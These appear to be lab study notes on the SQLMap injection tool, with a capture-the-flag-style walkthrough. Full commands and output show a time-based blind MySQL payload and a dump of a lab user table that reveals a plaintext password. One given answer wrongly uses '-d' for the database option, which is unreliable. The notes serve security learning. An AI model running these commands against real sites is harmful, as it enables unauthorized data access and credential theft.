

# SQLMap

This tool allows us to take the manual process of discovering and manipulating a database. SQLMap automates the detection and exploitation of vulnerable applications and databases.

[!NOTE] the --help flag will list all available flags/syntax, --wizard is also available if you do not want to manually add flags.

## Basic Syntax
```bash
user@ubuntu:~$ sqlmap --wizard
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]

[*] starting at 08:42:50

[08:42:50] [INFO] starting wizard interface
Please enter full target URL (-u):    
```

### Common Flags

- **"--dbs"** helps extract database names.
- **"-D database_name --tables"** extracts table information from defined database
- **"-D database_name -T table_name --dump"** enumerates table contents
- **"--cookie="SESSIONID=session1123"**

**Some URLs use "GET" parameters to retrieve data, if you see this, you can test the URL with -u flag in the SQLMap tool.

#### Modern Applications

Most modern applications use cookies to maintain user sessions, enforce authentication, or apply access controls.

SQLMap may not be sufficient here as unauthenticated requests could be redirected, denied, or return different contents. SQLMap supports session cookies such as (PHPSESSID or JSESSIONID).

These can be included into your requests. SQLMap interacts with an application the same way a web browser/normal user would.

#### Practical challenges
C1:
- Flag_1:
  - Q: Which flag in SQLMap is used to extract databases available
  - A: --dbs
- Flag_2:
  - Q: What would be the full command of SQLMap for extracting all tables from the members database?
  - A: sqlmap -u http://sqlmaptesting.thm/search/cat=1 -d members --tables

[!TIP] Post requests will send the data inside the body rather than the URL, we can intercept that request and modify it w/ SQLMap to exploit the vuln.

[!TIP] To find the GET parameters, use the inspect feature in your browser, go to network, and sent test credentials inside of the logon parameters, then use this URL for SQLmap.

C2:
- Flag_1:
  - Q: How many databases are available in this application?
  - A: 6
To find databases, we can use the following databases after finding the GET parameters for the URl.
```html
http://10.64.165.240/ai/includes/user_login?email=test@test.com&password=pass
```
```bash
┌──(root㉿kali)-[~]
└─# sqlmap -u "http://10.64.165.240/ai/includes/user_login?email=test@test.com&password=yourstikny" --dbs                                                                   
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.10#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illeal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:23:27 /2026-10-11/

[18:23:32] [INFO] testing connection to the target URL
[18:23:32] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:23:32] [INFO] testing if the target URL content is stable
[18:23:33] [INFO] target URL content is stable
[18:23:33] [INFO] testing if GET parameter 'email' is dynamic
[18:23:33] [INFO] GET parameter 'email' appears to be dynamic
[18:23:33] [WARNING] heuristic (basic) test shows that GET parameter 'email' might not be injectable
[18:23:33] [INFO] testing for SQL injection on GET parameter 'email'
[18:23:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:23:33] [WARNING] reflective value(s) found and filtering out
[18:23:33] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:23:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:23:33] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:23:33] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                             
[18:23:33] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:23:33] [INFO] testing 'Generic inline queries'
[18:23:33] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:23:33] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:23:33] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:23:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:23:53] [INFO] GET parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                                             
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[18:24:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:24:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:24:09] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:24:09] [INFO] target URL appears to have 4 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[18:24:32] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[18:24:33] [INFO] target URL appears to be UNION injectable with 4 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[18:24:40] [INFO] checking if the injection point on GET parameter 'email' is a false positive
GET parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
---
Parameter: email (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 7797 FROM (SELECT(SLEEP(5)))NvTN) AND 'XqUf'='XqUf&password=yourstikny
---
[18:25:23] [INFO] the back-end DBMS is MySQL
[18:25:23] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
web application technology: Apache 2.4.53
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:25:40] [INFO] fetching database names
[18:25:40] [INFO] fetching number of databases
[18:25:40] [INFO] retrieved: 
[18:26:01] [INFO] adjusting time delay to 1 second due to good response times
6
[18:26:03] [INFO] retrieved: information_schema
[18:27:58] [INFO] retrieved: ai
[18:28:06] [INFO] retrieved: mysql
[18:28:39] [INFO] retrieved: performance_schema
[18:30:30] [INFO] retrieved: phpmyadmin
[18:31:39] [INFO] retrieved: test
available databases [6]:
[*] ai
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

[18:32:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.64.165.240'                                                                        
[18:32:07] [WARNING] your sqlmap version is outdated

[*] ending @ 18:32:07 /2026-10-11/
```

- Flag_2:
  - Q: What is the name of the table available in the "AI" database?
  - A: User
```bash
┌──(root㉿kali)-[~]
└─# sqlmap -u 'http://10.64.165.240/ai/includes/user_login?email=&password=' -D ai --tables --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.10#stable}
|_ -| . [.]     | .'| . |                         
|___|_  ["]_|_|_|__,|  _|                         
      |_|V...       |_|   https://sqlmap.org      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:59:51 /2026-10-11/

[18:59:51] [WARNING] provided value for parameter 'email' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[18:59:51] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[18:59:51] [INFO] resuming back-end DBMS 'mysql' 
[18:59:51] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 7797 FROM (SELECT(SLEEP(5)))NvTN) AND 'XqUf'='XqUf&password=yourstikny
---
[18:59:51] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.53
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:59:51] [INFO] fetching tables for database: 'ai'                                                
[18:59:51] [INFO] fetching number of tables for database 'ai'
[18:59:51] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[18:59:51] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]y
1
[19:00:07] [INFO] retrieved: 
[19:00:27] [INFO] adjusting time delay to 1 second due to good response times
user
Database: ai
[1 table]
+------+
| user |
+------+
```
- Flag_3:
  - Q: What is the password for test@chatai.com?
  - A: 12345678
```bash
┌──(root㉿kali)-[~]
└─# sqlmap -u 'http://10.64.165.240/ai/includes/user_login?email=test@chatai.com&password=' -D ai -T user --dump  

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:04:34 /2026-10-11/

[19:04:34] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[19:04:34] [INFO] resuming back-end DBMS 'mysql' 
[19:04:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 7797 FROM (SELECT(SLEEP(5)))NvTN) AND 'XqUf'='XqUf&password=yourstikny
---
[19:04:34] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.53
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:04:34] [INFO] fetching columns for table 'user' in database 'ai'
[19:04:34] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[19:04:52] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
4
[19:04:52] [INFO] retrieved: 
[19:05:12] [INFO] adjusting time delay to 1 second due to good response times
id
[19:05:20] [INFO] retrieved: email
[19:05:47] [INFO] retrieved: password
[19:06:41] [INFO] retrieved: created
[19:07:18] [INFO] fetching entries for table 'user' in database 'ai'
[19:07:18] [INFO] fetching number of entries for table 'user' in database 'ai'
[19:07:18] [INFO] retrieved: 1
[19:07:20] [WARNING] (case) time-based comparison requires reset of statistical model, pl[19:07:20] [WARNING] reflective value(s) found and filtering out
.............................. (done)
2023-02-21 09:05:46
[19:09:30] [INFO] retrieved: test@chatai.com
[19:11:05] [INFO] retrieved: 1
[19:11:09] [INFO] retrieved: 12345678
Database: ai
Table: user
[1 entry]
+----+-----------------+---------------------+----------+
| id | email           | created             | password |
+----+-----------------+---------------------+----------+
| 1  | test@chatai.com | 2023-02-21 09:05:46 | 12345678 |
+----+-----------------+---------------------+----------+

[19:11:56] [INFO] table 'ai.`user`' dumped to CSV file '/root/.local/share/sqlmap/output/10.64.165.240/dump/ai/user.csv'                                                          
[19:11:56] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.64.165.240'                                                                        
[19:11:56] [WARNING] your sqlmap version is outdated

[*] ending @ 19:11:56 /2026-10-11/
```

